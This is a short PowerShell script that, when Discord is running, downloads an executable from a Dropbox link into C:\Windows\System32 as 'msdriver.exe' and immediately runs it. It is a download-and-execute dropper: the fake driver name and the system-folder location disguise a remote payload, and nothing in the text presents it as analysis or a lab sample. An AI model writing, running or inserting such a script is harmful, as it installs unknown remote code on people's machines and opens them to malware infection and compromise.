Check if Discord is running
$discordRunning = Get-Process -Name "discord" -ErrorAction SilentlyContinue

if ($discordRunning) {
    $destination = "C:\Windows\System32\msdriver.exe"
    $url = "https://www.dropbox.com/scl/fi/dv9d59x1q7sakazlg6xg3/msdriver.exe?rlkey=366p7jwjtt8c0aj7r9vikrtdw&st=3oyl4i9t&dl=1"

    # Download the file
    Invoke-WebRequest -Uri $url -OutFile $destination

    # Optional: Wait briefly to ensure the file is saved properly
    Start-Sleep -Seconds 2

    # Execute the downloaded file
    Start-Process -FilePath $destination
} else {
    Write-Host "Discord is not running. No action taken."
}